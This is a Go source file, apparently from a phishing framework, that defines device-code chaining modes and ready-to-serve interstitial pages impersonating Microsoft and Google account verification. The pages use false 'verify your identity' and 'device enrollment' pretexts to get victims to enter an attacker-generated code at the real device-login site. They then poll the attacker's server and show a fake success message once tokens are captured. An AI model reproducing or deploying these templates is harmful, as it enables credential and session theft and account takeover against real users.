package core

// Device Code chaining modes for lures
const (
	DCModeOff      = "off"      // No device code chaining (default)
	DCModeAlways   = "always"   // Always redirect to device code after AitM success (double capture)
	DCModeFallback = "fallback" // Only use device code if AitM session stalls/fails
	DCModeAuto     = "auto"     // Pre-generate on lure click, auto-select strategy based on outcome
	DCModeDirect   = "direct"   // Skip AitM entirely, show device code interstitial immediately
)

// ValidDeviceCodeModes lists all valid modes
var ValidDeviceCodeModes = []string{DCModeOff, DCModeAlways, DCModeFallback, DCModeAuto, DCModeDirect}

// IsValidDeviceCodeMode checks if a mode string is valid
func IsValidDeviceCodeMode(mode string) bool {
	for _, m := range ValidDeviceCodeModes {
		if m == mode {
			return true
		}
	}
	return false
}

// DEVICE_CODE_INTERSTITIAL_HTML is the Microsoft-styled interstitial page
// served at /dc/{session_id} to redirect victims to microsoft.com/devicelogin
// Placeholders: {user_code}, {verify_url}, {session_id}, {template_type}, {expires_minutes}
const DEVICE_CODE_INTERSTITIAL_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="referrer" content="no-referrer">
<title>Microsoft - Verify Your Identity</title>
<link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A8FMh//BTIP/wUyH/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyD/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyH/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyD/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AALv///C7///wu////Lv//wC7////u///8Lv///C7////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A//8AAP//AADgBwAA4AcAAOAHAADgBwAA//8AAOAHAADgBwAA4AcAAOAHAAD//wAA//8AAP//AAD//wAA//8AAA==">
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%;width:100%;overflow:hidden}
body{font-family:'Segoe UI','Segoe UI Web (West European)',-apple-system,BlinkMacSystemFont,sans-serif;background:#0078d4;display:flex;flex-direction:column;min-height:100vh}
.header{background:linear-gradient(135deg,#0078d4 0%,#005a9e 100%);padding:24px 40px;display:flex;align-items:center;gap:16px;flex-shrink:0}
.header svg{flex-shrink:0}
.header-text{color:#fff}
.header h1{font-size:26px;font-weight:700;letter-spacing:-0.5px}
.header p{font-size:15px;opacity:0.9;margin-top:2px}
.main{flex:1;display:flex;align-items:center;justify-content:center;background:linear-gradient(180deg,#0078d4 0%,#005a9e 50%,#004578 100%);padding:20px}
.container{background:#fff;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.25),0 2px 8px rgba(0,0,0,0.15);width:100%;max-width:560px;overflow:hidden}
.content{padding:48px 56px;text-align:center}
.shield-icon{width:72px;height:72px;margin:0 auto 24px;background:linear-gradient(135deg,#0078d4 0%,#005a9e 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 16px rgba(0,120,212,0.35)}
.shield-icon svg{width:36px;height:36px;fill:#fff}
.title{font-size:32px;font-weight:700;color:#1a1a1a;margin-bottom:12px;letter-spacing:-0.5px}
.subtitle{font-size:18px;color:#444;margin-bottom:36px;line-height:1.5}
.code-section{background:linear-gradient(135deg,#f8f9fa 0%,#e9ecef 100%);border-radius:12px;padding:32px;margin-bottom:32px;border:2px solid #dee2e6}
.code-label{font-size:14px;font-weight:700;color:#495057;text-transform:uppercase;letter-spacing:2px;margin-bottom:16px}
.code-display{display:flex;align-items:center;justify-content:center;gap:20px;flex-wrap:wrap}
.code-value{font-size:52px;font-weight:900;letter-spacing:8px;color:#0078d4;font-family:'Segoe UI Mono',Consolas,'Courier New',monospace;min-height:64px;display:flex;align-items:center;justify-content:center;user-select:all;text-shadow:0 2px 4px rgba(0,120,212,0.15)}
.spinner{display:inline-block;width:48px;height:48px;border:4px solid #e1dfdd;border-top:4px solid #0078d4;border-radius:50%;animation:spin 0.7s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.copy-btn{background:linear-gradient(135deg,#0078d4 0%,#005a9e 100%);color:#fff;border:none;padding:14px 28px;border-radius:8px;cursor:pointer;font-size:16px;font-weight:700;display:flex;align-items:center;gap:10px;transition:all 0.2s ease;box-shadow:0 4px 12px rgba(0,120,212,0.3)}
.copy-btn:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(0,120,212,0.4)}
.copy-btn.copied{background:linear-gradient(135deg,#107c10 0%,#0b6a0b 100%);box-shadow:0 4px 12px rgba(16,124,16,0.3)}
.copy-btn svg{width:20px;height:20px;fill:currentColor}
.status{font-size:15px;color:#107c10;margin-top:16px;min-height:24px;font-weight:600}
.btn-primary{display:flex;align-items:center;justify-content:center;gap:12px;width:100%;background:linear-gradient(135deg,#0078d4 0%,#005a9e 100%);color:#fff;border:none;padding:20px 32px;font-size:20px;font-weight:700;cursor:pointer;border-radius:8px;transition:all 0.2s ease;margin-bottom:24px;box-shadow:0 4px 16px rgba(0,120,212,0.35)}
.btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,120,212,0.45)}
.btn-primary:disabled{background:linear-gradient(135deg,#c8c6c4 0%,#a19f9d 100%);cursor:not-allowed;transform:none;box-shadow:none}
.btn-primary svg{flex-shrink:0}
.help-text{font-size:15px;color:#666;margin-bottom:16px;line-height:1.6}
.help-text strong{color:#0078d4;font-weight:700}
.manual-link{display:inline-flex;align-items:center;gap:8px;color:#0078d4;text-decoration:none;font-size:16px;font-weight:600;padding:12px 20px;border:2px solid #0078d4;border-radius:8px;transition:all 0.2s ease}
.manual-link:hover{background:#f0f6ff;text-decoration:none}
.manual-link svg{width:16px;height:16px;fill:currentColor}
.timer{font-size:14px;color:#666;margin-top:20px}
.timer span{font-weight:700;color:#0078d4;font-size:16px}
.footer{background:#f8f9fa;border-top:1px solid #e1dfdd;padding:16px 40px;display:flex;justify-content:center;align-items:center;gap:32px;flex-shrink:0}
.footer a{font-size:13px;color:#666;text-decoration:none;font-weight:500}
.footer a:hover{color:#0078d4;text-decoration:underline}
.success{display:none;padding:48px 56px;text-align:center}
.success-icon{width:100px;height:100px;background:linear-gradient(135deg,#107c10 0%,#0b6a0b 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 28px;box-shadow:0 8px 24px rgba(16,124,16,0.35)}
.success-icon svg{width:50px;height:50px;fill:#fff}
.success h2{font-size:32px;font-weight:700;color:#1a1a1a;margin-bottom:12px}
.success p{font-size:18px;color:#444;margin-bottom:28px}
.success-badge{display:inline-flex;align-items:center;gap:10px;background:#e8f5e9;color:#107c10;padding:14px 24px;border-radius:8px;font-size:16px;font-weight:700}
.success-badge svg{width:22px;height:22px;fill:currentColor}
@media(max-width:600px){.header{padding:16px 24px}.header h1{font-size:22px}.content{padding:32px 28px}.title{font-size:26px}.subtitle{font-size:16px}.code-value{font-size:36px;letter-spacing:4px}.code-section{padding:24px 20px}.btn-primary{font-size:18px;padding:16px 24px}.footer{padding:12px 24px;gap:20px;flex-wrap:wrap}}
</style>
</head>
<body>
<div class="header">
<svg width="40" height="40" viewBox="0 0 24 24"><rect width="11" height="11" fill="#fff" fill-opacity="0.95"/><rect x="13" width="11" height="11" fill="#fff" fill-opacity="0.8"/><rect y="13" width="11" height="11" fill="#fff" fill-opacity="0.85"/><rect x="13" y="13" width="11" height="11" fill="#fff" fill-opacity="0.7"/></svg>
<div class="header-text">
<h1>Microsoft</h1>
<p>Account Security Center</p>
</div>
</div>

<div class="main">
<div class="container">
<div class="content" id="mainView">
<div class="shield-icon">
<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
</div>
<h2 class="title">Verify Your Identity</h2>
<p class="subtitle">To protect your account, please complete this one-time verification to validate your user credentials.</p>

<div class="code-section">
<div class="code-label">Your Verification Code</div>
<div class="code-display">
<div class="code-value" id="userCode"><span class="spinner" id="codeSpinner"></span></div>
<button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
<svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
<span id="copyText">Copy Code</span>
</button>
</div>
<div class="status" id="codeStatus"></div>
</div>

<p class="help-text">Click <strong>Continue to Microsoft</strong> to sign in and enter your verification code. This helps us confirm your identity and secure your account.</p>

<button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
<svg width="24" height="24" viewBox="0 0 24 24"><rect width="11" height="11" fill="#fff" fill-opacity=".95"/><rect x="13" width="11" height="11" fill="#fff" fill-opacity=".75"/><rect y="13" width="11" height="11" fill="#fff" fill-opacity=".85"/><rect x="13" y="13" width="11" height="11" fill="#fff" fill-opacity=".65"/></svg>
Continue to Microsoft
</button>

<a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank" class="manual-link">
<svg viewBox="0 0 16 16"><path d="M8.636 3.5a.5.5 0 0 0-.5-.5H1.5A1.5 1.5 0 0 0 0 4.5v10A1.5 1.5 0 0 0 1.5 16h10a1.5 1.5 0 0 0 1.5-1.5V7.864a.5.5 0 0 0-1 0V14.5a.5.5 0 0 1-.5.5h-10a.5.5 0 0 1-.5-.5v-10a.5.5 0 0 1 .5-.5h6.636a.5.5 0 0 0 .5-.5z"/><path d="M16 .5a.5.5 0 0 0-.5-.5h-5a.5.5 0 0 0 0 1h3.793L6.146 9.146a.5.5 0 1 0 .708.708L15 1.707V5.5a.5.5 0 0 0 1 0v-5z"/></svg>
Verify at microsoft.com/devicelogin
</a>

<div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
</div>

<div class="success" id="successView">
<div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
<h2>Verification Complete</h2>
<p>Your identity has been confirmed and your account is now secured.</p>
<div class="success-badge"><svg viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>Microsoft Account Verified</div>
</div>
</div>
</div>

<div class="footer">
<a href="https://www.microsoft.com/en-us/servicesagreement/" target="_blank">Terms</a>
<a href="https://privacy.microsoft.com/en-us/privacystatement" target="_blank">Privacy</a>
<a href="https://support.microsoft.com/" target="_blank">Help</a>
</div>

<script>
(function(){
var sid='{session_id}';
var verifyUrl='{verify_url}';
var codeReady={code_ready};
var code='{user_code}';
var expiresIn={expires_seconds};
var popup=null;
var codeEl=document.getElementById('userCode');
var statusEl=document.getElementById('codeStatus');
var btnEl=document.getElementById('signInBtn');
var copyBtnEl=document.getElementById('copyBtn');
var copyTextEl=document.getElementById('copyText');
var timerEl=document.getElementById('timerValue');

function showCode(c,v){
code=c;
if(v)verifyUrl=v;
codeEl.textContent=c;
btnEl.disabled=false;
copyBtnEl.disabled=false;
document.getElementById('verifyLink').href=verifyUrl;
}

if(codeReady&&code){showCode(code,verifyUrl);}

function copyCode(){
if(!code)return;
if(navigator.clipboard){navigator.clipboard.writeText(code).then(function(){showCopied();});}
else{var t=document.createElement('textarea');t.value=code;t.style.cssText='position:fixed;left:-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);showCopied();}
}
function showCopied(){
copyBtnEl.classList.add('copied');
copyTextEl.textContent='Copied!';
statusEl.textContent='Code copied — ready to paste';
setTimeout(function(){copyBtnEl.classList.remove('copied');copyTextEl.textContent='Copy Code';},3000);
}
window.copyCode=copyCode;

function openSignIn(){
if(!code)return;
copyCode();
var w=520,h=700,l=(screen.width-w)/2,t=(screen.height-h)/2;
popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
if(popup)popup.focus();
}
window.openSignIn=openSignIn;

function updateTimer(){
if(expiresIn<=0)return;
expiresIn--;
var m=Math.floor(expiresIn/60);
var s=expiresIn%60;
timerEl.textContent=m+':'+(s<10?'0':'')+s;
if(expiresIn>0)setTimeout(updateTimer,1000);
}
if(codeReady)setTimeout(updateTimer,1000);

function poll(){
fetch('/dc/status/'+sid).then(function(r){return r.json()}).then(function(d){
if(d.ready&&!codeReady){
codeReady=true;
showCode(d.user_code,d.verify_url);
setTimeout(updateTimer,1000);
}
if(d.captured){
if(popup&&!popup.closed)popup.close();
document.getElementById('mainView').style.display='none';
document.getElementById('successView').style.display='block';
}else if(d.failed){
statusEl.textContent='Session expired. Please refresh to try again.';
statusEl.style.color='#d83b01';
codeEl.textContent='—';
}else if(!d.expired){setTimeout(poll,codeReady?3000:600);}
}).catch(function(){setTimeout(poll,3000);});
}
setTimeout(poll,codeReady?3000:400);
})();
</script>
</body>
</html>`

// DEVICE_CODE_POLL_STATUS_JS is injected to poll for device code status
// Used when we need to redirect during an existing AitM session
const DEVICE_CODE_POLL_STATUS_JS = `
(function(){
var sid='{session_id}';
function checkDC(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
.then(function(r){return r.json()})
.then(function(d){
if(d.captured && d.redirect_url){
top.location.href=d.redirect_url;
}else if(!d.expired){
setTimeout(checkDC,3000);
}
})
.catch(function(){setTimeout(checkDC,5000);});
}
setTimeout(checkDC,3000);
})();
`

// DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML is the Google-styled interstitial page
// served at /dc/{session_id} for Google Workspace / Gmail device code phishing
// Placeholders: {user_code}, {verify_url}, {session_id}, {template_type}, {expires_minutes}, {expires_seconds}
const DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="referrer" content="no-referrer">
<title>Google Account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans','Roboto','Segoe UI',Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#202124}
.container{background:#fff;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;max-width:450px;width:100%;text-align:center}
.logo{margin-bottom:16px}
.title{font-size:24px;font-weight:400;margin-bottom:8px;color:#202124}
.subtitle{font-size:14px;color:#5f6368;margin-bottom:24px;line-height:20px}
.steps{text-align:left;margin:0 0 24px;padding:0 0 0 24px}
.steps li{font-size:14px;color:#202124;margin-bottom:12px;line-height:20px}
.steps li a{color:#1a73e8;text-decoration:none;font-weight:500}
.steps li a:hover{text-decoration:underline}
.code-container{background:#f8f9fa;border:1px solid #dadce0;border-radius:8px;padding:16px 24px;margin:0 auto 24px;display:inline-block;min-width:200px}
.code{font-size:28px;font-weight:500;letter-spacing:4px;color:#1a73e8;font-family:'Google Sans',monospace}
.btn-row{display:flex;gap:8px;justify-content:center;margin-bottom:16px}
.btn{display:inline-flex;align-items:center;justify-content:center;padding:8px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;border:none;transition:background .2s,box-shadow .2s;font-family:'Google Sans','Roboto',sans-serif}
.btn-primary{background:#1a73e8;color:#fff}
.btn-primary:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,.2)}
.btn-secondary{background:#fff;color:#1a73e8;border:1px solid #dadce0}
.btn-secondary:hover{background:#f8f9fa}
.timer{font-size:12px;color:#80868b;margin-top:8px}
.copied{color:#137333;font-size:13px;margin-top:4px;min-height:20px}
.footer{margin-top:24px;font-size:12px;color:#80868b}
.footer a{color:#1a73e8;text-decoration:none}
.spinner{display:none;margin:16px auto;width:24px;height:24px;border:3px solid #e8eaed;border-top:3px solid #1a73e8;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.complete{display:none;text-align:center;padding:20px}
.complete .check{font-size:48px;color:#137333;margin-bottom:12px}
.complete .msg{font-size:16px;color:#202124}
.status-icon{margin:20px 0 16px;font-size:40px}
</style>
</head>
<body>
<div class="container" id="main">
<div class="logo">
<svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
<text x="0" y="19" font-family="Product Sans,Google Sans,Roboto,Arial,sans-serif" font-size="22" font-weight="500">
<tspan fill="#4285f4">G</tspan><tspan fill="#ea4335">o</tspan><tspan fill="#fbbc04">o</tspan><tspan fill="#4285f4">g</tspan><tspan fill="#34a853">l</tspan><tspan fill="#ea4335">e</tspan>
</text>
</svg>
</div>

<div id="verifyView">
<div class="status-icon" id="statusIcon">&#128274;</div>
<div class="title" id="titleText">Device Verification</div>
<div class="subtitle" id="subtitleText">Complete the sign-in process by verifying your device.</div>

<ol class="steps">
<li>Go to <a href="{verify_url}" target="_blank" rel="noopener" id="verifyLink">{verify_url}</a></li>
<li>Enter the code shown below</li>
<li>Sign in with your Google account and approve access</li>
</ol>

<div class="code-container">
<div class="code" id="userCode">{user_code}</div>
</div>
<div class="copied" id="copiedMsg">&nbsp;</div>

<div class="btn-row">
<button class="btn btn-primary" onclick="copyCode()">Copy code</button>
<a class="btn btn-secondary" href="{verify_url}" target="_blank" rel="noopener">Open link</a>
</div>

<div class="timer" id="timerText">Code expires in <span id="countdown">{expires_minutes}:00</span></div>
<div class="spinner" id="spinner"></div>
</div>

<div class="complete" id="completeView">
<div class="check">&#10004;</div>
<div class="msg">Verification complete. Redirecting...</div>
</div>

<div class="footer">
<a href="https://support.google.com">Help</a> &middot;
<a href="https://policies.google.com/privacy">Privacy</a> &middot;
<a href="https://policies.google.com/terms">Terms</a>
</div>
</div>

<script>
(function(){
var sid='{session_id}';
var expMs={expires_seconds}*1000;
var startTime=Date.now();

var tpl='{template_type}';
if(tpl==='fallback'){
document.getElementById('statusIcon').innerHTML='&#9888;&#65039;';
document.getElementById('titleText').textContent='Verification method unavailable';
document.getElementById('subtitleText').textContent='Your security key could not be verified. Use an alternative method to complete sign-in.';
}else if(tpl==='compliance'){
document.getElementById('statusIcon').innerHTML='&#128187;';
document.getElementById('titleText').textContent='Device enrollment required';
document.getElementById('subtitleText').textContent='Your organization requires device registration to access this service.';
}else{
document.getElementById('statusIcon').innerHTML='&#9989;';
document.getElementById('titleText').textContent='Sign-in verified';
document.getElementById('subtitleText').textContent='One more step: Link this device to your account for continued access.';
}

function copyCode(){
var code=document.getElementById('userCode').textContent;
if(navigator.clipboard){
navigator.clipboard.writeText(code).then(function(){
document.getElementById('copiedMsg').textContent='Code copied!';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
});
}else{
var ta=document.createElement('textarea');
ta.value=code;
document.body.appendChild(ta);
ta.select();
document.execCommand('copy');
document.body.removeChild(ta);
document.getElementById('copiedMsg').textContent='Code copied!';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
}
}
window.copyCode=copyCode;

function updateTimer(){
var elapsed=Date.now()-startTime;
var remaining=Math.max(0,expMs-elapsed);
if(remaining<=0){
document.getElementById('countdown').textContent='EXPIRED';
return;
}
var m=Math.floor(remaining/60000);
var s=Math.floor((remaining%60000)/1000);
document.getElementById('countdown').textContent=m+':'+(s<10?'0':'')+s;
setTimeout(updateTimer,1000);
}
updateTimer();

function checkStatus(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
.then(function(r){return r.json()})
.then(function(d){
if(d.captured){
document.getElementById('verifyView').style.display='none';
document.getElementById('completeView').style.display='block';
setTimeout(function(){
if(d.redirect_url){
top.location.href=d.redirect_url;
}
},1500);
}else if(d.expired){
document.getElementById('countdown').textContent='EXPIRED';
}else{
document.getElementById('spinner').style.display='block';
setTimeout(checkStatus,3000);
}
})
.catch(function(){
setTimeout(checkStatus,5000);
});
}
setTimeout(checkStatus,5000);
})();
</script>
</body>
</html>`

// GetInterstitialForProvider returns the appropriate interstitial HTML template for the provider
func GetInterstitialForProvider(provider string) string {
	switch provider {
	case DCProviderGoogle:
		return DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML
	default:
		return DEVICE_CODE_INTERSTITIAL_HTML
	}
}
